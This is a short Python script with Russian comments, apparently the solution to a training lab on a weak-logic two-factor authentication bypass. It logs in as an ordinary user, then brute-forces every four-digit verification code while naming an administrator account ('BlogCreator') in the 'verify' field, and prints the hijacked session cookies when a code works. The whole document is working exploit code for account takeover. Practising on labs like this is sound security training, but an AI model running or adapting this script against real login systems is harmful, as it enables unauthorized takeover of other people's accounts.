
import requests
import time
s = requests.Session()
url = 'http://127.0.0.1:8000' 
# 1. Получаем сессию: логинимся обычным пользователем
login_data = {
    'username': 'laplas',   # логин существующего пользователя
    'password': '123123'
}
# r = s.post('http://lap3-2fa_bypass_weak_logic.labs-is-here.online/login', data=login_data)
r = s.post(f'{url}/login', data=login_data)

print('Login status:', r.status_code)
print(r.text)
assert r.status_code == 200 or r.status_code == 302  # редирект на /login/verify

print('assert passed')
# 2. Теперь брутфорсим verif_code для чужого пользователя
for code in range(10000):
    code_str = f'{code:04d}' 
    data = {
        'verif_code': code_str,
        'verify': 'BlogCreator'  # имя админа
    }
    r = s.post(f'{url}/login/verify', data=data)
    print('cur code:', code_str, r.status_code)
    if 'Login successful!' in r.text:
        print(f'[+] Код найден: {code_str}')
        print(s.cookies.get_dict())
        break
